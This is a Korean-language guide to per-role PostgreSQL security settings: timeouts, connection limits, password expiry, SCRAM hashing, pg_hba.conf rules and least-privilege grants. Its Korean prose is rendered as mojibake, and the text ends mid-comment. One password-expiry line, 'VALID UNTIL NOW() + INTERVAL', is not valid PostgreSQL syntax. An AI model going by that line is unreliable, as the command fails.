&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ì„¸ì…˜ ë ˆë²¨ì—ì„œ ì„¤ì • (30ë¶„)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; idle_session_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;30min&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ì „ì—­ ì„¤ì • (postgresql.conf)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;idle_session_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;30min&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- íŠ¹ì • ì‚¬ìš©ìì— ì„¤ì •&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ALTER&lt;/span&gt; ROLE webapp_user &lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; idle_session_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;30min&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- íŠ¹ì • ë°ì´í„°ë² ì´ìŠ¤ì— ì„¤ì •&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ALTER&lt;/span&gt; DATABASE mydb &lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; idle_session_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;1h&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;âœ…-statement-timeout&quot;&gt;&lt;a href=&quot;#âœ…-statement-timeout&quot; class=&quot;headerlink&quot; title=&quot;âœ… statement_timeout&quot;&gt;&lt;/a&gt;âœ… statement_timeout&lt;/h3&gt;&lt;p&gt;ë‹¨ì¼ ì¿¼ë¦¬ì˜ ìµœëŒ€ ì‹¤í–‰ ì‹œê°„ì„ ì œí•œí•˜ì—¬ ê³¼ë„í•œ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©ì„ ë°©ì§€í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ì„¸ì…˜ ë ˆë²¨ (10ì´ˆ)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; statement_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;10s&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ì: ì§§ì€ íƒ€ì„ì•„ì›ƒ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ALTER&lt;/span&gt; ROLE webapp_user &lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; statement_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;30s&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ë°°ì¹˜ ì‘ì—… ì‚¬ìš©ì: ê¸´ íƒ€ì„ì•„ì›ƒ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ALTER&lt;/span&gt; ROLE batch_user &lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; statement_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;10min&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ê´€ë¦¬ì: ì œí•œ ì—†ìŒ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ALTER&lt;/span&gt; ROLE admin_user &lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; statement_timeout &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/database/postgresql-logo.png"></p><h2 id="ğŸ”’-PostgreSQL-ì‚¬ìš©ìë³„-ë³´ì•ˆ-ì„¤ì •-ì™„ë²½-ê°€ì´ë“œ"><a href="#ğŸ”’-PostgreSQL-ì‚¬ìš©ìë³„-ë³´ì•ˆ-ì„¤ì •-ì™„ë²½-ê°€ì´ë“œ" class="headerlink" title="ğŸ”’ PostgreSQL ì‚¬ìš©ìë³„ ë³´ì•ˆ ì„¤ì • ì™„ë²½ ê°€ì´ë“œ"></a>ğŸ”’ PostgreSQL ì‚¬ìš©ìë³„ ë³´ì•ˆ ì„¤ì • ì™„ë²½ ê°€ì´ë“œ</h2><p>PostgreSQLì—ì„œëŠ” ì‚¬ìš©ì(Role)ë³„ë¡œ ë‹¤ì–‘í•œ ë³´ì•ˆ ì„¤ì •ì„ ì ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì•ˆì „í•˜ê²Œ ë³´í˜¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br>ì´ ë¬¸ì„œì—ì„œëŠ” ì„¸ì…˜ íƒ€ì„ì•„ì›ƒë¶€í„° ì ‘ì† ì œí•œ, ê¶Œí•œ ê´€ë¦¬ê¹Œì§€ ì‹¤ë¬´ì—ì„œ ê¼­ í•„ìš”í•œ ë³´ì•ˆ ì„¤ì •ë“¤ì„ ì •ë¦¬í•©ë‹ˆë‹¤.</p><h2 id="1ï¸âƒ£-ì„¸ì…˜-íƒ€ì„ì•„ì›ƒ-ì„¤ì •"><a href="#1ï¸âƒ£-ì„¸ì…˜-íƒ€ì„ì•„ì›ƒ-ì„¤ì •" class="headerlink" title="1ï¸âƒ£ ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì„¤ì •"></a>1ï¸âƒ£ ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì„¤ì •</h2><h3 id="âœ…-idle-session-timeout-PostgreSQL-14"><a href="#âœ…-idle-session-timeout-PostgreSQL-14" class="headerlink" title="âœ… idle_session_timeout (PostgreSQL 14+)"></a>âœ… idle_session_timeout (PostgreSQL 14+)</h3><p>ìœ íœ´ ì„¸ì…˜ì„ ìë™ìœ¼ë¡œ ì¢…ë£Œí•˜ì—¬ ë¶ˆí•„ìš”í•œ ì—°ê²°ì„ ì •ë¦¬í•©ë‹ˆë‹¤.</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ì„¸ì…˜ ë ˆë²¨ì—ì„œ ì„¤ì • (30ë¶„)</span></span><br><span class="line"><span class="keyword">SET</span> idle_session_timeout <span class="operator">=</span> <span class="string">&#x27;30min&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì „ì—­ ì„¤ì • (postgresql.conf)</span></span><br><span class="line">idle_session_timeout <span class="operator">=</span> <span class="string">&#x27;30min&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- íŠ¹ì • ì‚¬ìš©ìì— ì„¤ì •</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user <span class="keyword">SET</span> idle_session_timeout <span class="operator">=</span> <span class="string">&#x27;30min&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- íŠ¹ì • ë°ì´í„°ë² ì´ìŠ¤ì— ì„¤ì •</span></span><br><span class="line"><span class="keyword">ALTER</span> DATABASE mydb <span class="keyword">SET</span> idle_session_timeout <span class="operator">=</span> <span class="string">&#x27;1h&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="âœ…-statement-timeout"><a href="#âœ…-statement-timeout" class="headerlink" title="âœ… statement_timeout"></a>âœ… statement_timeout</h3><p>ë‹¨ì¼ ì¿¼ë¦¬ì˜ ìµœëŒ€ ì‹¤í–‰ ì‹œê°„ì„ ì œí•œí•˜ì—¬ ê³¼ë„í•œ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©ì„ ë°©ì§€í•©ë‹ˆë‹¤.</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ì„¸ì…˜ ë ˆë²¨ (10ì´ˆ)</span></span><br><span class="line"><span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="string">&#x27;10s&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ì: ì§§ì€ íƒ€ì„ì•„ì›ƒ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user <span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="string">&#x27;30s&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ë°°ì¹˜ ì‘ì—… ì‚¬ìš©ì: ê¸´ íƒ€ì„ì•„ì›ƒ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE batch_user <span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="string">&#x27;10min&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ê´€ë¦¬ì: ì œí•œ ì—†ìŒ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE admin_user <span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="âœ…-idle-in-transaction-session-timeout"><a href="#âœ…-idle-in-transaction-session-timeout" class="headerlink" title="âœ… idle_in_transaction_session_timeout"></a>âœ… idle_in_transaction_session_timeout</h3><p>íŠ¸ëœì­ì…˜ ë‚´ì—ì„œ ìœ íœ´ ìƒíƒœì¸ ì„¸ì…˜ì„ ì¢…ë£Œí•©ë‹ˆë‹¤. ë°ë“œë½ê³¼ í…Œì´ë¸” ë½ ë¬¸ì œë¥¼ ì˜ˆë°©í•©ë‹ˆë‹¤.</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ì„¸ì…˜ ë ˆë²¨ (5ë¶„)</span></span><br><span class="line"><span class="keyword">SET</span> idle_in_transaction_session_timeout <span class="operator">=</span> <span class="string">&#x27;5min&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì „ì—­ ì„¤ì • (postgresql.conf)</span></span><br><span class="line">idle_in_transaction_session_timeout <span class="operator">=</span> <span class="string">&#x27;5min&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- OLTP ì• í”Œë¦¬ì¼€ì´ì…˜: ì§§ê²Œ ì„¤ì •</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user <span class="keyword">SET</span> idle_in_transaction_session_timeout <span class="operator">=</span> <span class="string">&#x27;60s&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="ğŸ“Š-í˜„ì¬-íƒ€ì„ì•„ì›ƒ-ì„¤ì •-í™•ì¸"><a href="#ğŸ“Š-í˜„ì¬-íƒ€ì„ì•„ì›ƒ-ì„¤ì •-í™•ì¸" class="headerlink" title="ğŸ“Š í˜„ì¬ íƒ€ì„ì•„ì›ƒ ì„¤ì • í™•ì¸"></a>ğŸ“Š í˜„ì¬ íƒ€ì„ì•„ì›ƒ ì„¤ì • í™•ì¸</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- í˜„ì¬ ì„¸ì…˜ì˜ ì„¤ì • í™•ì¸</span></span><br><span class="line"><span class="keyword">SHOW</span> idle_session_timeout;</span><br><span class="line"><span class="keyword">SHOW</span> statement_timeout;</span><br><span class="line"><span class="keyword">SHOW</span> idle_in_transaction_session_timeout;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ëª¨ë“  íƒ€ì„ì•„ì›ƒ ì„¤ì • í™•ì¸</span></span><br><span class="line"><span class="keyword">SELECT</span> name, setting, unit, context</span><br><span class="line"><span class="keyword">FROM</span> pg_settings</span><br><span class="line"><span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;%timeout%&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì‚¬ìš©ìë³„ ì„¤ì • í™•ì¸</span></span><br><span class="line"><span class="keyword">SELECT</span> rolname, rolconfig</span><br><span class="line"><span class="keyword">FROM</span> pg_roles</span><br><span class="line"><span class="keyword">WHERE</span> rolconfig <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure><h2 id="2ï¸âƒ£-ì—°ê²°-ìˆ˜-ì œí•œ"><a href="#2ï¸âƒ£-ì—°ê²°-ìˆ˜-ì œí•œ" class="headerlink" title="2ï¸âƒ£ ì—°ê²° ìˆ˜ ì œí•œ"></a>2ï¸âƒ£ ì—°ê²° ìˆ˜ ì œí•œ</h2><h3 id="âœ…-CONNECTION-LIMIT"><a href="#âœ…-CONNECTION-LIMIT" class="headerlink" title="âœ… CONNECTION LIMIT"></a>âœ… CONNECTION LIMIT</h3><p>ì‚¬ìš©ìë³„ ë™ì‹œ ì—°ê²° ìˆ˜ë¥¼ ì œí•œí•˜ì—¬ ë¦¬ì†ŒìŠ¤ ê³ ê°ˆì„ ë°©ì§€í•©ë‹ˆë‹¤.</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ìƒˆ ì‚¬ìš©ì ìƒì„± ì‹œ ì—°ê²° ìˆ˜ ì œí•œ</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE webapp_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;secure_password&#x27;</span></span><br><span class="line">CONNECTION LIMIT <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ê¸°ì¡´ ì‚¬ìš©ìì˜ ì—°ê²° ìˆ˜ ì œí•œ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE readonly_user CONNECTION LIMIT <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ë¬´ì œí•œ ì—°ê²° (ì£¼ì˜: ê´€ë¦¬ìë§Œ)</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE admin_user CONNECTION LIMIT <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><h3 id="ğŸ“Š-í˜„ì¬-ì—°ê²°-ìƒíƒœ-ëª¨ë‹ˆí„°ë§"><a href="#ğŸ“Š-í˜„ì¬-ì—°ê²°-ìƒíƒœ-ëª¨ë‹ˆí„°ë§" class="headerlink" title="ğŸ“Š í˜„ì¬ ì—°ê²° ìƒíƒœ ëª¨ë‹ˆí„°ë§"></a>ğŸ“Š í˜„ì¬ ì—°ê²° ìƒíƒœ ëª¨ë‹ˆí„°ë§</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ì‚¬ìš©ìë³„ í˜„ì¬ ì—°ê²° ìˆ˜ í™•ì¸</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    usename,</span><br><span class="line">    <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> active_connections,</span><br><span class="line">    <span class="built_in">MAX</span>(backend_start) <span class="keyword">as</span> last_connection</span><br><span class="line"><span class="keyword">FROM</span> pg_stat_activity</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> usename</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> active_connections <span class="keyword">DESC</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ìœ íœ´ ì—°ê²° í™•ì¸</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    pid,</span><br><span class="line">    usename,</span><br><span class="line">    application_name,</span><br><span class="line">    state,</span><br><span class="line">    state_change,</span><br><span class="line">    NOW() <span class="operator">-</span> state_change <span class="keyword">as</span> idle_duration</span><br><span class="line"><span class="keyword">FROM</span> pg_stat_activity</span><br><span class="line"><span class="keyword">WHERE</span> state <span class="operator">=</span> <span class="string">&#x27;idle&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> idle_duration <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><h2 id="3ï¸âƒ£-ë¹„ë°€ë²ˆí˜¸-ì •ì±…"><a href="#3ï¸âƒ£-ë¹„ë°€ë²ˆí˜¸-ì •ì±…" class="headerlink" title="3ï¸âƒ£ ë¹„ë°€ë²ˆí˜¸ ì •ì±…"></a>3ï¸âƒ£ ë¹„ë°€ë²ˆí˜¸ ì •ì±…</h2><h3 id="âœ…-ë¹„ë°€ë²ˆí˜¸-ë§Œë£Œ-ì„¤ì •"><a href="#âœ…-ë¹„ë°€ë²ˆí˜¸-ë§Œë£Œ-ì„¤ì •" class="headerlink" title="âœ… ë¹„ë°€ë²ˆí˜¸ ë§Œë£Œ ì„¤ì •"></a>âœ… ë¹„ë°€ë²ˆí˜¸ ë§Œë£Œ ì„¤ì •</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ë¹„ë°€ë²ˆí˜¸ 90ì¼ í›„ ë§Œë£Œ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user VALID UNTIL <span class="string">&#x27;2025-03-01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- í˜„ì¬ ì‹œê°„ ê¸°ì¤€ 90ì¼ í›„ ë§Œë£Œ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user VALID UNTIL NOW() <span class="operator">+</span> <span class="type">INTERVAL</span> <span class="string">&#x27;90 days&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ë§Œë£Œ ì—†ìŒ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE admin_user VALID UNTIL <span class="string">&#x27;infinity&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="âœ…-SCRAM-SHA-256-ì•”í˜¸í™”"><a href="#âœ…-SCRAM-SHA-256-ì•”í˜¸í™”" class="headerlink" title="âœ… SCRAM-SHA-256 ì•”í˜¸í™”"></a>âœ… SCRAM-SHA-256 ì•”í˜¸í™”</h3><p>md5ë³´ë‹¤ ì•ˆì „í•œ í•´ì‹œ ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- postgresql.conf</span></span><br><span class="line">password_encryption <span class="operator">=</span> scram<span class="operator">-</span>sha<span class="number">-256</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ê¸°ì¡´ ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • (SCRAMìœ¼ë¡œ ë³€í™˜)</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user PASSWORD <span class="string">&#x27;new_secure_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì‚¬ìš©ìì˜ ì•”í˜¸í™” ë°©ì‹ í™•ì¸</span></span><br><span class="line"><span class="keyword">SELECT</span> rolname, rolpassword</span><br><span class="line"><span class="keyword">FROM</span> pg_authid</span><br><span class="line"><span class="keyword">WHERE</span> rolname <span class="operator">=</span> <span class="string">&#x27;webapp_user&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="4ï¸âƒ£-ë„¤íŠ¸ì›Œí¬-ë°-IP-ì ‘ê·¼-ì œì–´"><a href="#4ï¸âƒ£-ë„¤íŠ¸ì›Œí¬-ë°-IP-ì ‘ê·¼-ì œì–´" class="headerlink" title="4ï¸âƒ£ ë„¤íŠ¸ì›Œí¬ ë° IP ì ‘ê·¼ ì œì–´"></a>4ï¸âƒ£ ë„¤íŠ¸ì›Œí¬ ë° IP ì ‘ê·¼ ì œì–´</h2><h3 id="âœ…-pg-hba-conf-ì„¤ì •"><a href="#âœ…-pg-hba-conf-ì„¤ì •" class="headerlink" title="âœ… pg_hba.conf ì„¤ì •"></a>âœ… pg_hba.conf ì„¤ì •</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># TYPE  DATABASE    USER            ADDRESS         METHOD</span><br><span class="line"></span><br><span class="line"># ë¡œì»¬ ì—°ê²°ë§Œ í—ˆìš© (ê´€ë¦¬ì)</span><br><span class="line">local   all         admin_user                      scram-sha-256</span><br><span class="line"></span><br><span class="line"># íŠ¹ì • IP ëŒ€ì—­ì—ì„œë§Œ ì ‘ì† í—ˆìš©</span><br><span class="line">hostssl all         webapp_user     10.0.1.0/24     scram-sha-256</span><br><span class="line"></span><br><span class="line"># íŠ¹ì • ë°ì´í„°ë² ì´ìŠ¤ë§Œ ì ‘ê·¼ í—ˆìš©</span><br><span class="line">hostssl myapp_db    app_user        10.0.2.0/24     scram-sha-256</span><br><span class="line"></span><br><span class="line"># ì½ê¸° ì „ìš© ì‚¬ìš©ìëŠ” íŠ¹ì • IPì—ì„œë§Œ</span><br><span class="line">hostssl all         readonly_user   192.168.1.100/32 scram-sha-256</span><br><span class="line"></span><br><span class="line"># SSL ì—°ê²° ê°•ì œ + í´ë¼ì´ì–¸íŠ¸ ì¸ì¦ì„œ ê²€ì¦</span><br><span class="line">hostssl all         all             0.0.0.0/0       scram-sha-256 clientcert=verify-full</span><br></pre></td></tr></table></figure><h2 id="5ï¸âƒ£-ê¶Œí•œ-ìµœì†Œí™”-ì›ì¹™-Least-Privilege"><a href="#5ï¸âƒ£-ê¶Œí•œ-ìµœì†Œí™”-ì›ì¹™-Least-Privilege" class="headerlink" title="5ï¸âƒ£ ê¶Œí•œ ìµœì†Œí™” ì›ì¹™ (Least Privilege)"></a>5ï¸âƒ£ ê¶Œí•œ ìµœì†Œí™” ì›ì¹™ (Least Privilege)</h2><h3 id="âœ…-ì½ê¸°-ì „ìš©-ì‚¬ìš©ì"><a href="#âœ…-ì½ê¸°-ì „ìš©-ì‚¬ìš©ì" class="headerlink" title="âœ… ì½ê¸° ì „ìš© ì‚¬ìš©ì"></a>âœ… ì½ê¸° ì „ìš© ì‚¬ìš©ì</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ì½ê¸° ì „ìš© ì‚¬ìš©ì ìƒì„±</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE readonly_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;secure_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- íŠ¹ì • ìŠ¤í‚¤ë§ˆì˜ ì½ê¸° ê¶Œí•œë§Œ ë¶€ì—¬</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">ON</span> DATABASE mydb <span class="keyword">TO</span> readonly_user;</span><br><span class="line"><span class="keyword">GRANT</span> USAGE <span class="keyword">ON</span> SCHEMA public <span class="keyword">TO</span> readonly_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">ALL</span> TABLES <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> readonly_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- í–¥í›„ ìƒì„±ë  í…Œì´ë¸”ì—ë„ ìë™ ì ìš©</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DEFAULT</span> PRIVILEGES <span class="keyword">IN</span> SCHEMA public</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> TABLES <span class="keyword">TO</span> readonly_user;</span><br></pre></td></tr></table></figure><h3 id="âœ…-ì• í”Œë¦¬ì¼€ì´ì…˜-ì‚¬ìš©ì-ì½ê¸°-ì“°ê¸°"><a href="#âœ…-ì• í”Œë¦¬ì¼€ì´ì…˜-ì‚¬ìš©ì-ì½ê¸°-ì“°ê¸°" class="headerlink" title="âœ… ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ì (ì½ê¸°&#x2F;ì“°ê¸°)"></a>âœ… ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ì (ì½ê¸°&#x2F;ì“°ê¸°)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ì ìƒì„±</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE app_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;secure_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- íŠ¹ì • í…Œì´ë¸”ì—ë§Œ ì½ê¸°/ì“°ê¸° ê¶Œí•œ</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">ON</span> DATABASE mydb <span class="keyword">TO</span> app_user;</span><br><span class="line"><span class="keyword">GRANT</span> USAGE <span class="keyword">ON</span> SCHEMA public <span class="keyword">TO</span> app_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> users, orders <span class="keyword">TO</span> app_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> products <span class="keyword">TO</span> app_user; <span class="comment">-- ì½ê¸°ë§Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- DELETE ê¶Œí•œì€ ë³„ë„ ê´€ë¦¬</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">DELETE</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> orders <span class="keyword">TO</span> app_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì‹œí€€ìŠ¤ ì‚¬ìš© ê¶Œí•œ (INSERT ì‹œ í•„ìš”)</span></span><br><span class="line"><span class="keyword">GRANT</span> USAGE <span class="keyword">ON</span> <span class="keyword">ALL</span> SEQUENCES <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> app_user;</span><br></pre></td></tr></table></figure><h3 id="âœ…-ê´€ë¦¬ì-vs-ì¼ë°˜-ì‚¬ìš©ì-ë¶„ë¦¬"><a href="#âœ…-ê´€ë¦¬ì-vs-ì¼ë°˜-ì‚¬ìš©ì-ë¶„ë¦¬" class="headerlink" title="âœ… ê´€ë¦¬ì vs ì¼ë°˜ ì‚¬ìš©ì ë¶„ë¦¬"></a>âœ… ê´€ë¦¬ì vs ì¼ë°˜ ì‚¬ìš©ì ë¶„ë¦¬</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ì¼ë°˜ ì‚¬ìš©ìëŠ” ìŠˆí¼ìœ ì € ê¶Œí•œ ì—†ì´</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE app_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ê´€ë¦¬ìëŠ” í•„ìš”í•œ ê¶Œí•œë§Œ</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE db_admin <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;password&#x27;</span></span><br><span class="line">CREATEROLE CREATEDB;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ìŠˆí¼ìœ ì €ëŠ” ìµœì†Œí™” (postgresë§Œ ì‚¬ìš©)</span></span><br><span class="line"><span class="comment">-- CREATE ROLE super_admin WITH 